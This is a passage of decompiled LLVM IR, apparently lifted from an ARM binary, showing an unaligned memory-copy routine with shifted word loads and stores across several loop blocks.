  %v6_14cc0 = icmp slt i32 %v5_14cc0, 0
  store i1 %v6_14cc0, i1* %cpsr_v.global-to-local, align 1
  %v7_14cc0 = icmp slt i32 %v2_14cc0, 0
  store i1 %v7_14cc0, i1* %cpsr_n.global-to-local, align 1
  %v5_14cc4 = icmp slt i32 %v0_14cc8, 12
  switch i2 %v0_14bdc.off0, label %dec_label_pc_14be8 [
    i2 -1, label %dec_label_pc_14cc0
    i2 -2, label %dec_label_pc_14c54
  ]

dec_label_pc_14be8:                               ; preds = %dec_label_pc_14bd4
  br i1 %v5_14cc4, label %dec_label_pc_14c34, label %dec_label_pc_14bf0

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14be8
  store i32 %v2_14cc0, i32* %r2.global-to-local, align 4
  %v3_14bf4 = load i32, i32* @r4, align 4
  store i32 %v3_14bf4, i32* %stack_var_-16, align 4
  %v6_14bf4 = load i32, i32* @r5, align 4
  store i32 %v6_14bf4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %dec_label_pc_14bf8.dec_label_pc_14bf8_crit_edge, %dec_label_pc_14bf0
  %v0_14c1c = phi i32 [ %v12_14c1c, %dec_label_pc_14bf8.dec_label_pc_14bf8_crit_edge ], [ %v0_14c1c75, %dec_label_pc_14bf0 ]
  %v0_14bfc = phi i32 [ %v0_14bfc.pre, %dec_label_pc_14bf8.dec_label_pc_14bf8_crit_edge ], [ %v4_14bd8, %dec_label_pc_14bf0 ]
  %v0_14bf8 = phi i32 [ %v0_14bf8.pre, %dec_label_pc_14bf8.dec_label_pc_14bf8_crit_edge ], [ %v2_14bd8, %dec_label_pc_14bf0 ]
  %v3_14bf8 = udiv i32 %v0_14bf8, 256
  store i32 %v3_14bf8, i32* %r3.global-to-local, align 4
  %v1_14bfc = inttoptr i32 %v0_14bfc to i32*
  %v2_14bfc = load i32, i32* %v1_14bfc, align 4
  store i32 %v2_14bfc, i32* %r4.global-to-local, align 4
  %v3_14bfc = add i32 %v0_14bfc, 4
  %v4_14bfc = inttoptr i32 %v3_14bfc to i32*
  %v5_14bfc = load i32, i32* %v4_14bfc, align 4
  store i32 %v5_14bfc, i32* %r5.global-to-local, align 4
  %v6_14bfc = add i32 %v0_14bfc, 8
  %v7_14bfc = inttoptr i32 %v6_14bfc to i32*
  %v8_14bfc = load i32, i32* %v7_14bfc, align 4
  store i32 %v8_14bfc, i32* %ip.global-to-local, align 4
  %v9_14bfc = add i32 %v0_14bfc, 12
  %v10_14bfc = inttoptr i32 %v9_14bfc to i32*
  %v11_14bfc = load i32, i32* %v10_14bfc, align 4
  store i32 %v11_14bfc, i32* @lr, align 4
  %v12_14bfc = add i32 %v0_14bfc, 16
  store i32 %v12_14bfc, i32* %r1.global-to-local, align 4
  %v4_14c00 = mul i32 %v2_14bfc, 16777216
  %v5_14c00 = or i32 %v4_14c00, %v3_14bf8
  store i32 %v5_14c00, i32* %r3.global-to-local, align 4
  %v3_14c04 = udiv i32 %v2_14bfc, 256
  %v4_14c08 = mul i32 %v5_14bfc, 16777216
  %v5_14c08 = or i32 %v4_14c08, %v3_14c04
  store i32 %v5_14c08, i32* %r4.global-to-local, align 4
  %v3_14c0c = udiv i32 %v5_14bfc, 256
  %v4_14c10 = mul i32 %v8_14bfc, 16777216
  %v5_14c10 = or i32 %v4_14c10, %v3_14c0c
  store i32 %v5_14c10, i32* %r5.global-to-local, align 4
  %v3_14c14 = udiv i32 %v8_14bfc, 256
  %v4_14c18 = mul i32 %v11_14bfc, 16777216
  %v5_14c18 = or i32 %v4_14c18, %v3_14c14
  store i32 %v5_14c18, i32* @ip, align 4
  %v1_14c1c = inttoptr i32 %v0_14c1c to i32*
  store i32 %v5_14c00, i32* %v1_14c1c, align 4
  %v3_14c1c = add i32 %v0_14c1c, 4
  %v4_14c1c = inttoptr i32 %v3_14c1c to i32*
  %v5_14c1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14c1c, i32* %v4_14c1c, align 4
  %v6_14c1c = add i32 %v0_14c1c, 8
  %v7_14c1c = inttoptr i32 %v6_14c1c to i32*
  %v8_14c1c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14c1c, i32* %v7_14c1c, align 4
  %v9_14c1c = add i32 %v0_14c1c, 12
  %v10_14c1c = inttoptr i32 %v9_14c1c to i32*
  %v11_14c1c = load i32, i32* @ip, align 4
  store i32 %v11_14c1c, i32* %v10_14c1c, align 4
  %v12_14c1c = add i32 %v0_14c1c, 16
  store i32 %v12_14c1c, i32* %r0.global-to-local, align 4
  %v0_14c20 = load i32, i32* %r2.global-to-local, align 4
  %v2_14c20 = add i32 %v0_14c20, -16
  store i32 %v2_14c20, i32* %r2.global-to-local, align 4
  %v6_14c24 = icmp slt i32 %v0_14c20, 16
  br i1 %v6_14c24, label %dec_label_pc_14c28, label %dec_label_pc_14bf8.dec_label_pc_14bf8_crit_edge

dec_label_pc_14bf8.dec_label_pc_14bf8_crit_edge:  ; preds = %dec_label_pc_14bf8
  %v0_14bf8.pre = load i32, i32* @lr, align 4
  %v0_14bfc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14bf8

dec_label_pc_14c28:                               ; preds = %dec_label_pc_14bf8
  %v2_14c28 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14c28, i32* @r4, align 4
  %v5_14c28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14c28, i32* @r5, align 4
  %v2_14c2c = add i32 %v0_14c20, -4
  store i32 %v2_14c2c, i32* %r2.global-to-local, align 4
  %v4_14c2c = add i32 %v0_14c20, 2147483632
  %v5_14c2c = and i32 %v2_14c2c, %v4_14c2c
  %v6_14c2c = icmp slt i32 %v5_14c2c, 0
  store i1 %v6_14c2c, i1* %cpsr_v.global-to-local, align 1
  %v7_14c2c = icmp slt i32 %v2_14c2c, 0
  store i1 %v7_14c2c, i1* %cpsr_n.global-to-local, align 1
  %v5_14c30 = icmp slt i32 %v2_14c20, -12
  br i1 %v5_14c30, label %dec_label_pc_14c4c, label %dec_label_pc_14c34

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14c28, %dec_label_pc_14be8, %dec_label_pc_14c34
  %v1_14c40 = phi i32 [ %v4_14c40, %dec_label_pc_14c34 ], [ %v12_14c1c, %dec_label_pc_14c28 ], [ %v0_14c1c75, %dec_label_pc_14be8 ]
  %v0_14c34 = load i32, i32* @lr, align 4
  %v3_14c34 = udiv i32 %v0_14c34, 256
  store i32 %v3_14c34, i32* %ip.global-to-local, align 4
  %v0_14c38 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c38 = inttoptr i32 %v0_14c38 to i32*
  %v2_14c38 = load i32, i32* %v1_14c38, align 4
  store i32 %v2_14c38, i32* @lr, align 4
  %v4_14c38 = add i32 %v0_14c38, 4
  store i32 %v4_14c38, i32* %r1.global-to-local, align 4
  %v4_14c3c = mul i32 %v2_14c38, 16777216
  %v5_14c3c = or i32 %v4_14c3c, %v3_14c34
  store i32 %v5_14c3c, i32* @ip, align 4
  %v2_14c40 = inttoptr i32 %v1_14c40 to i32*
  store i32 %v5_14c3c, i32* %v2_14c40, align 4
  %v3_14c40 = load i32, i32* %r0.global-to-local, align 4
  %v4_14c40 = add i32 %v3_14c40, 4
  store i32 %v4_14c40, i32* %r0.global-to-local, align 4
  %v0_14c44 = load i32, i32* %r2.global-to-local, align 4
  %v2_14c44 = add i32 %v0_14c44, -4
  store i32 %v2_14c44, i32* %r2.global-to-local, align 4
  %v6_14c48 = icmp slt i32 %v0_14c44, 4
  br i1 %v6_14c48, label %dec_label_pc_14c4c.loopexit, label %dec_label_pc_14c34

dec_label_pc_14c4c.loopexit:                      ; preds = %dec_label_pc_14c34
  %v4_14c44 = sub i32 3, %v0_14c44
  %v5_14c44 = and i32 %v4_14c44, %v0_14c44
  %v6_14c44 = icmp slt i32 %v5_14c44, 0
  %v7_14c44 = icmp slt i32 %v2_14c44, 0
  store i1 %v6_14c44, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14c44, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14c4c

dec_label_pc_14c4c:                               ; preds = %dec_label_pc_14c4c.loopexit, %dec_label_pc_14c28
  %v2_14b8c113 = phi i32 [ %v4_14c40, %dec_label_pc_14c4c.loopexit ], [ %v12_14c1c, %dec_label_pc_14c28 ]
  %v0_14b7c109 = phi i32 [ %v2_14c44, %dec_label_pc_14c4c.loopexit ], [ %v2_14c2c, %dec_label_pc_14c28 ]
  %v0_14c4c = load i32, i32* %r1.global-to-local, align 4
  %v1_14c4c = add i32 %v0_14c4c, -3
  store i32 %v1_14c4c, i32* @r1, align 4
  br label %bb133

dec_label_pc_14c54:                               ; preds = %dec_label_pc_14bd4
  br i1 %v5_14cc4, label %dec_label_pc_14ca0, label %dec_label_pc_14c5c

dec_label_pc_14c5c:                               ; preds = %dec_label_pc_14c54
  store i32 %v2_14cc0, i32* %r2.global-to-local, align 4
  %v3_14c60 = load i32, i32* @r4, align 4
  store i32 %v3_14c60, i32* %stack_var_-16, align 4
  %v6_14c60 = load i32, i32* @r5, align 4
  store i32 %v6_14c60, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14c64

dec_label_pc_14c64:                               ; preds = %dec_label_pc_14c64.dec_label_pc_14c64_crit_edge, %dec_label_pc_14c5c
  %v0_14c88 = phi i32 [ %v12_14c88, %dec_label_pc_14c64.dec_label_pc_14c64_crit_edge ], [ %v0_14c1c75, %dec_label_pc_14c5c ]
  %v0_14c68 = phi i32 [ %v0_14c68.pre, %dec_label_pc_14c64.dec_label_pc_14c64_crit_edge ], [ %v4_14bd8, %dec_label_pc_14c5c ]
  %v0_14c64 = phi i32 [ %v0_14c64.pre, %dec_label_pc_14c64.dec_label_pc_14c64_crit_edge ], [ %v2_14bd8, %dec_label_pc_14c5c ]
  %v3_14c64 = udiv i32 %v0_14c64, 65536
  store i32 %v3_14c64, i32* %r3.global-to-local, align 4
  %v1_14c68 = inttoptr i32 %v0_14c68 to i32*
  %v2_14c68 = load i32, i32* %v1_14c68, align 4
  store i32 %v2_14c68, i32* %r4.global-to-local, align 4
  %v3_14c68 = add i32 %v0_14c68, 4
  %v4_14c68 = inttoptr i32 %v3_14c68 to i32*
  %v5_14c68 = load i32, i32* %v4_14c68, align 4
  store i32 %v5_14c68, i32* %r5.global-to-local, align 4
  %v6_14c68 = add i32 %v0_14c68, 8
  %v7_14c68 = inttoptr i32 %v6_14c68 to i32*
  %v8_14c68 = load i32, i32* %v7_14c68, align 4
  store i32 %v8_14c68, i32* %ip.global-to-local, align 4
  %v9_14c68 = add i32 %v0_14c68, 12
  %v10_14c68 = inttoptr i32 %v9_14c68 to i32*
  %v11_14c68 = load i32, i32* %v10_14c68, align 4
  store i32 %v11_14c68, i32* @lr, align 4
  %v12_14c68 = add i32 %v0_14c68, 16
  store i32 %v12_14c68, i32* %r1.global-to-local, align 4
  %v4_14c6c = mul i32 %v2_14c68, 65536
  %v5_14c6c = or i32 %v4_14c6c, %v3_14c64
  store i32 %v5_14c6c, i32* %r3.global-to-local, align 4
  %v3_14c70 = udiv i32 %v2_14c68, 65536
  %v4_14c74 = mul i32 %v5_14c68, 65536
  %v5_14c74 = or i32 %v4_14c74, %v3_14c70
  store i32 %v5_14c74, i32* %r4.global-to-local, align 4
  %v3_14c78 = udiv i32 %v5_14c68, 65536
  %v4_14c7c = mul i32 %v8_14c68, 65536
  %v5_14c7c = or i32 %v4_14c7c, %v3_14c78
  store i32 %v5_14c7c, i32* %r5.global-to-local, align 4
  %v3_14c80 = udiv i32 %v8_14c68, 65536
  %v4_14c84 = mul i32 %v11_14c68, 65536
  %v5_14c84 = or i32 %v4_14c84, %v3_14c80
  store i32 %v5_14c84, i32* @ip, align 4
  %v1_14c88 = inttoptr i32 %v0_14c88 to i32*
  store i32 %v5_14c6c, i32* %v1_14c88, align 4
  %v3_14c88 = add i32 %v0_14c88, 4
  %v4_14c88 = inttoptr i32 %v3_14c88 to i32*
  %v5_14c88 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14c88, i32* %v4_14c88, align 4
  %v6_14c88 = add i32 %v0_14c88, 8
  %v7_14c88 = inttoptr i32 %v6_14c88 to i32*
  %v8_14c88 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14c88, i32* %v7_14c88, align 4
  %v9_14c88 = add i32 %v0_14c88, 12
  %v10_14c88 = inttoptr i32 %v9_14c88 to i32*
  %v11_14c88 = load i32, i32* @ip, align 4
  store i32 %v11_14c88, i32* %v10_14c88, align 4
  %v12_14c88 = add i32 %v0_14c88, 16
  store i32 %v12_14c88, i32* %r0.global-to-local, align 4
  %v0_14c8c = load i32, i32* %r2.global-to-local, align 4
  %v2_14c8c = add i32 %v0_14c8c, -16
  store i32 %v2_14c8c, i32* %r2.global-to-local, align 4
  %v6_14c90 = icmp slt i32 %v0_14c8c, 16
  br i1 %v6_14c90, label %dec_label_pc_14c94, label %dec_label_pc_14c64.dec_label_pc_14c64_crit_edge

dec_label_pc_14c64.dec_label_pc_14c64_crit_edge:  ; preds = %dec_label_pc_14c64
  %v0_14c64.pre = load i32, i32* @lr, align 4
  %v0_14c68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14c64

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c64
  %v2_14c94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14c94, i32* @r4, align 4
  %v5_14c94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14c94, i32* @r5, align 4
  %v2_14c98 = add i32 %v0_14c8c, -4
  store i32 %v2_14c98, i32* %r2.global-to-local, align 4
  %v4_14c98 = add i32 %v0_14c8c, 2147483632
  %v5_14c98 = and i32 %v2_14c98, %v4_14c98
  %v6_14c98 = icmp slt i32 %v5_14c98, 0
  store i1 %v6_14c98, i1* %cpsr_v.global-to-local, align 1
  %v7_14c98 = icmp slt i32 %v2_14c98, 0
  store i1 %v7_14c98, i1* %cpsr_n.global-to-local, align 1
  %v5_14c9c = icmp slt i32 %v2_14c8c, -12
  br i1 %v5_14c9c, label %dec_label_pc_14cb8, label %dec_label_pc_14ca0

dec_label_pc_14ca0:                               ; preds = %dec_label_pc_14c94, %dec_label_pc_14c54, %dec_label_pc_14ca0
  %v1_14cac = phi i32 [ %v4_14cac, %dec_label_pc_14ca0 ], [ %v12_14c88, %dec_label_pc_14c94 ], [ %v0_14c1c75, %dec_label_pc_14c54 ]
  %v0_14ca0 = load i32, i32* @lr, align 4
  %v3_14ca0 = udiv i32 %v0_14ca0, 65536
  store i32 %v3_14ca0, i32* %ip.global-to-local, align 4
  %v0_14ca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ca4 = inttoptr i32 %v0_14ca4 to i32*
  %v2_14ca4 = load i32, i32* %v1_14ca4, align 4
  store i32 %v2_14ca4, i32* @lr, align 4
  %v4_14ca4 = add i32 %v0_14ca4, 4
  store i32 %v4_14ca4, i32* %r1.global-to-local, align 4
  %v4_14ca8 = mul i32 %v2_14ca4, 65536
  %v5_14ca8 = or i32 %v4_14ca8, %v3_14ca0
  store i32 %v5_14ca8, i32* @ip, align 4
  %v2_14cac = inttoptr i32 %v1_14cac to i32*
  store i32 %v5_14ca8, i32* %v2_14cac, align 4
  %v3_14cac = load i32, i32* %r0.global-to-local, align 4
  %v4_14cac = add i32 %v3_14cac, 4
  store i32 %v4_14cac, i32* %r0.global-to-local, align 4
  %v0_14cb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14cb0 = add i32 %v0_14cb0, -4
  store i32 %v2_14cb0, i32* %r2.global-to-local, align 4
  %v6_14cb4 = icmp slt i32 %v0_14cb0, 4
  br i1 %v6_14cb4, label %dec_label_pc_14cb8.loopexit, label %dec_label_pc_14ca0

dec_label_pc_14cb8.loopexit:                      ; preds = %dec_label_pc_14ca0
  %v4_14cb0 = sub i32 3, %v0_14cb0
  %v5_14cb0 = and i32 %v4_14cb0, %v0_14cb0
  %v6_14cb0 = icmp slt i32 %v5_14cb0, 0
  %v7_14cb0 = icmp slt i32 %v2_14cb0, 0
  store i1 %v6_14cb0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14cb0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14cb8

dec_label_pc_14cb8:                               ; preds = %dec_label_pc_14cb8.loopexit, %dec_label_pc_14c94
  %v2_14b8c112 = phi i32 [ %v4_14cac, %dec_label_pc_14cb8.loopexit ], [ %v12_14c88, %dec_label_pc_14c94 ]
  %v0_14b7c108 = phi i32 [ %v2_14cb0, %dec_label_pc_14cb8.loopexit ], [ %v2_14c98, %dec_label_pc_14c94 ]
  %v0_14cb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14cb8 = add i32 %v0_14cb8, -2
  store i32 %v1_14cb8, i32* @r1, align 4
  br label %bb133

dec_label_pc_14cc0:                               ; preds = %dec_label_pc_14bd4
  br i1 %v5_14cc4, label %dec_label_pc_14d0c, label %dec_label_pc_14cc8

dec_label_pc_14cc8:                               ; preds = %dec_label_pc_14cc0
  store i32 %v2_14cc0, i32* %r2.global-to-local, align 4
  %v3_14ccc = load i32, i32* @r4, align 4
  store i32 %v3_14ccc, i32* %stack_var_-16, align 4
  %v6_14ccc = load i32, i32* @r5, align 4
  store i32 %v6_14ccc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14cd0

dec_label_pc_14cd0:                               ; preds = %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge, %dec_label_pc_14cc8
  %v0_14cf4 = phi i32 [ %v12_14cf4, %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge ], [ %v0_14c1c75, %dec_label_pc_14cc8 ]
  %v0_14cd4 = phi i32 [ %v0_14cd4.pre, %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge ], [ %v4_14bd8, %dec_label_pc_14cc8 ]
  %v0_14cd0 = phi i32 [ %v0_14cd0.pre, %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge ], [ %v2_14bd8, %dec_label_pc_14cc8 ]
  %v3_14cd0 = udiv i32 %v0_14cd0, 16777216
  store i32 %v3_14cd0, i32* %r3.global-to-local, align 4
  %v1_14cd4 = inttoptr i32 %v0_14cd4 to i32*
  %v2_14cd4 = load i32, i32* %v1_14cd4, align 4
  store i32 %v2_14cd4, i32* %r4.global-to-local, align 4
  %v3_14cd4 = add i32 %v0_14cd4, 4
  %v4_14cd4 = inttoptr i32 %v3_14cd4 to i32*
  %v5_14cd4 = load i32, i32* %v4_14cd4, align 4
  store i32 %v5_14cd4, i32* %r5.global-to-local, align 4
  %v6_14cd4 = add i32 %v0_14cd4, 8
  %v7_14cd4 = inttoptr i32 %v6_14cd4 to i32*
  %v8_14cd4 = load i32, i32* %v7_14cd4, align 4
  store i32 %v8_14cd4, i32* %ip.global-to-local, align 4
  %v9_14cd4 = add i32 %v0_14cd4, 12
  %v10_14cd4 = inttoptr i32 %v9_14cd4 to i32*
  %v11_14cd4 = load i32, i32* %v10_14cd4, align 4
  store i32 %v11_14cd4, i32* @lr, align 4
  %v12_14cd4 = add i32 %v0_14cd4, 16
  store i32 %v12_14cd4, i32* %r1.global-to-local, align 4
  %v4_14cd8 = mul i32 %v2_14cd4, 256
  %v5_14cd8 = or i32 %v4_14cd8, %v3_14cd0
  store i32 %v5_14cd8, i32* %r3.global-to-local, align 4
  %v3_14cdc = udiv i32 %v2_14cd4, 16777216
  %v4_14ce0 = mul i32 %v5_14cd4, 256
  %v5_14ce0 = or i32 %v4_14ce0, %v3_14cdc
  store i32 %v5_14ce0, i32* %r4.global-to-local, align 4
  %v3_14ce4 = udiv i32 %v5_14cd4, 16777216
  %v4_14ce8 = mul i32 %v8_14cd4, 256
  %v5_14ce8 = or i32 %v4_14ce8, %v3_14ce4
  store i32 %v5_14ce8, i32* %r5.global-to-local, align 4
  %v3_14cec = udiv i32 %v8_14cd4, 16777216
  %v4_14cf0 = mul i32 %v11_14cd4, 256
  %v5_14cf0 = or i32 %v4_14cf0, %v3_14cec
  store i32 %v5_14cf0, i32* @ip, align 4
  %v1_14cf4 = inttoptr i32 %v0_14cf4 to i32*
  store i32 %v5_14cd8, i32* %v1_14cf4, align 4
  %v3_14cf4 = add i32 %v0_14cf4, 4
  %v4_14cf4 = inttoptr i32 %v3_14cf4 to i32*
  %v5_14cf4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14cf4, i32* %v4_14cf4, align 4
  %v6_14cf4 = add i32 %v0_14cf4, 8
  %v7_14cf4 = inttoptr i32 %v6_14cf4 to i32*
  %v8_14cf4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14cf4, i32* %v7_14cf4, align 4
  %v9_14cf4 = add i32 %v0_14cf4, 12
  %v10_14cf4 = inttoptr i32 %v9_14cf4 to i32*
  %v11_14cf4 = load i32, i32* @ip, align 4
  store i32 %v11_14cf4, i32* %v10_14cf4, align 4
  %v12_14cf4 = add i32 %v0_14cf4, 16
  store i32 %v12_14cf4, i32* %r0.global-to-local, align 4
  %v0_14cf8 = load i32, i32* %r2.global-to-local, align 4
  %v2_14cf8 = add i32 %v0_14cf8, -16
  store i32 %v2_14cf8, i32* %r2.global-to-local, align 4
  %v6_14cfc = icmp slt i32 %v0_14cf8, 16
  br i1 %v6_14cfc, label %dec_label_pc_14d00, label %dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge

dec_label_pc_14cd0.dec_label_pc_14cd0_crit_edge:  ; preds = %dec_label_pc_14cd0
  %v0_14cd0.pre = load i32, i32* @lr, align 4
  %v0_14cd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14cd0

dec_label_pc_14d00:                               ; preds = %dec_label_pc_14cd0
  %v2_14d00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d00, i32* @r4, align 4
  %v5_14d00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14d00, i32* @r5, align 4
  %v2_14d04 = add i32 %v0_14cf8, -4
  store i32 %v2_14d04, i32* %r2.global-to-local, align 4
  %v4_14d04 = add i32 %v0_14cf8, 2147483632
  %v5_14d04 = and i32 %v2_14d04, %v4_14d04
  %v6_14d04 = icmp slt i32 %v5_14d04, 0
  store i1 %v6_14d04, i1* %cpsr_v.global-to-local, align 1
  %v7_14d04 = icmp slt i32 %v2_14d04, 0
  store i1 %v7_14d04, i1* %cpsr_n.global-to-local, align 1
  %v5_14d08 = icmp slt i32 %v2_14cf8, -12
  br i1 %v5_14d08, label %dec_label_pc_14d24, label %dec_label_pc_14d0c

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14d00, %dec_label_pc_14cc0, %dec_label_pc_14d0c
  %v1_14d18 = phi i32 [ %v4_14d18, %dec_label_pc_14d0c ], [ %v12_14cf4, %dec_label_pc_14d00 ], [ %v0_14c1c75, %dec_label_pc_14cc0 ]
  %v0_14d0c = load i32, i32* @lr, align 4
  %v3_14d0c = udiv i32 %v0_14d0c, 16777216
  store i32 %v3_14d0c, i32* %ip.global-to-local, align 4
  %v0_14d10 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d10 = inttoptr i32 %v0_14d10 to i32*
  %v2_14d10 = load i32, i32* %v1_14d10, align 4
  store i32 %v2_14d10, i32* @lr, align 4
  %v4_14d10 = add i32 %v0_14d10, 4
  store i32 %v4_14d10, i32* %r1.global-to-local, align 4
  %v4_14d14 = mul i32 %v2_14d10, 256
  %v5_14d14 = or i32 %v4_14d14, %v3_14d0c
  store i32 %v5_14d14, i32* @ip, align 4
  %v2_14d18 = inttoptr i32 %v1_14d18 to i32*
  store i32 %v5_14d14, i32* %v2_14d18, align 4
  %v3_14d18 = load i32, i32* %r0.global-to-local, align 4
  %v4_14d18 = add i32 %v3_14d18, 4
  store i32 %v4_14d18, i32* %r0.global-to-local, align 4
  %v0_14d1c = load i32, i32* %r2.global-to-local, align 4
  %v2_14d1c = add i32 %v0_14d1c, -4
  store i32 %v2_14d1c, i32* %r2.global-to-local, align 4
  %v6_14d20 = icmp slt i32 %v0_14d1c, 4
  br i1 %v6_14d20, label %dec_label_pc_14d24.loopexit, label %dec_label_pc_14d0c

dec_label_pc_14d24.loopexit:                      ; preds = %dec_label_pc_14d0c
  %v4_14d1c = sub i32 3, %v0_14d1c
  %v5_14d1c = and i32 %v4_14d1c, %v0_14d1c
  %v6_14d1c = icmp slt i32 %v5_14d1c, 0
  %v7_14d1c = icmp slt i32 %v2_14d1c, 0
  store i1 %v6_14d1c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14d1c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14d24

dec_label_pc_14d24:                               ; preds = %dec_label_pc_14d24.loopexit, %dec_label_pc_14d00
  %v2_14b8c114 = phi i32 [ %v4_14d18, %dec_label_pc_14d24.loopexit ], [ %v12_14cf4, %dec_label_pc_14d00 ]
  %v0_14b7c110 = phi i32 [ %v2_14d1c, %dec_label_pc_14d24.loopexit ], [ %v2_14d04, %dec_label_pc_14d00 ]
  %v0_14d24 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d24 = add i32 %v0_14d24, -1
  store i32 %v1_14d24, i32* @r1, align 4
  br label %bb133

dec_label_pc_14d2c:                               ; preds = %entry
  %v1_14d2c = load i32, i32* @r2, align 4
  %v2_14d2c = add i32 %v1_14d2c, %v0_14ae0
  store i32 %v2_14d2c, i32* @r1, align 4
  %v2_14d30 = add i32 %v1_14d2c, %v1_14ae0
  store i32 %v2_14d30, i32* %r0.global-to-local, align 4
  %v2_14d34 = add i32 %v1_14d2c, -4
  store i32 %v2_14d34, i32* %r2.global-to-local, align 4
  %v4_14d34 = sub i32 3, %v1_14d2c
  %v5_14d34 = and i32 %v4_14d34, %v1_14d2c
  %v6_14d34 = icmp slt i32 %v5_14d34, 0
  store i1 %v6_14d34, i1* %cpsr_v.global-to-local, align 1
  %v7_14d34 = icmp slt i32 %v2_14d34, 0
  store i1 %v7_14d34, i1* %cpsr_n.global-to-local, align 1
  %v5_14d38 = icmp slt i32 %v1_14d2c, 4
  br i1 %v5_14d38, label %bb143, label %dec_label_pc_14d3c

dec_label_pc_14d3c:                               ; preds = %dec_label_pc_14d2c
  %v1_14d3c = urem i32 %v2_14d30, 4
  store i32 %v1_14d3c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14d3c = icmp eq i32 %v1_14d3c, 0
  br i1 %v2_14d3c, label %dec_label_pc_14d44, label %dec_label_pc_14de4

dec_label_pc_14d44:                               ; preds = %dec_label_pc_14d3c
  %v1_14d44 = urem i32 %v2_14d2c, 4
  store i32 %v1_14d44, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14d44 = icmp eq i32 %v1_14d44, 0
  br i1 %v2_14d44, label %dec_label_pc_14d4c, label %dec_label_pc_14e10

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d44, %dec_label_pc_14e08
  %v0_14d6449 = phi i32 [ %v2_14d30, %dec_label_pc_14d44 ], [ %v0_14e5832, %dec_label_pc_14e08 ]
  %v0_14d6048 = phi i32 [ %v2_14d2c, %dec_label_pc_14d44 ], [ %v0_14e08, %dec_label_pc_14e08 ]
  %v0_14d4c = phi i32 [ %v2_14d34, %dec_label_pc_14d44 ], [ %v2_14e00, %dec_label_pc_14e08 ]
  %v2_14d4c = add i32 %v0_14d4c, -8
  store i32 %v2_14d4c, i32* %r2.global-to-local, align 4
  %v4_14d4c = sub i32 7, %v0_14d4c
  %v5_14d4c = and i32 %v4_14d4c, %v0_14d4c
  %v6_14d4c = icmp slt i32 %v5_14d4c, 0
  store i1 %v6_14d4c, i1* %cpsr_v.global-to-local, align 1
  %v7_14d4c = icmp slt i32 %v2_14d4c, 0
  store i1 %v7_14d4c, i1* %cpsr_n.global-to-local, align 1
  %v5_14d50 = icmp slt i32 %v0_14d4c, 8
  br i1 %v5_14d50, label %dec_label_pc_14d9c, label %dec_label_pc_14d54

dec_label_pc_14d54:                               ; preds = %dec_label_pc_14d4c
  %v3_14d54 = load i32, i32* @r4, align 4
  %v5_14d54 = inttoptr i32 %v3_14d54 to i8*
  store i8* %v5_14d54, i8** %stack_var_-8, align 4
  %v8_14d54 = load i32, i32* @lr, align 4
  %v2_14d58 = add i32 %v0_14d4c, -28
  store i32 %v2_14d58, i32* %r2.global-to-local, align 4
  %v4_14d58 = sub i32 27, %v0_14d4c
  %v5_14d58 = and i32 %v4_14d58, %v2_14d4c
  %v6_14d58 = icmp slt i32 %v5_14d58, 0
  store i1 %v6_14d58, i1* %cpsr_v.global-to-local, align 1
  %v7_14d58 = icmp slt i32 %v2_14d58, 0
  store i1 %v7_14d58, i1* %cpsr_n.global-to-local, align 1
  %v5_14d5c = icmp slt i32 %v2_14d4c, 20
  br i1 %v5_14d5c, label %dec_label_pc_14d78, label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d54, %dec_label_pc_14d60.dec_label_pc_14d60_crit_edge
  %v0_14d64 = phi i32 [ %v1_14d6c, %dec_label_pc_14d60.dec_label_pc_14d60_crit_edge ], [ %v0_14d6449, %dec_label_pc_14d54 ]
  %v0_14d60 = phi i32 [ %v0_14d60.pre, %dec_label_pc_14d60.dec_label_pc_14d60_crit_edge ], [ %v0_14d6048, %dec_label_pc_14d54 ]
  %v1_14d60 = add i32 %v0_14d60, -4
  %v2_14d60 = inttoptr i32 %v1_14d60 to i32*
  %v3_14d60 = load i32, i32* %v2_14d60, align 4
  store i32 %v3_14d60, i32* %r3.global-to-local, align 4
  %v4_14d60 = add i32 %v0_14d60, -8
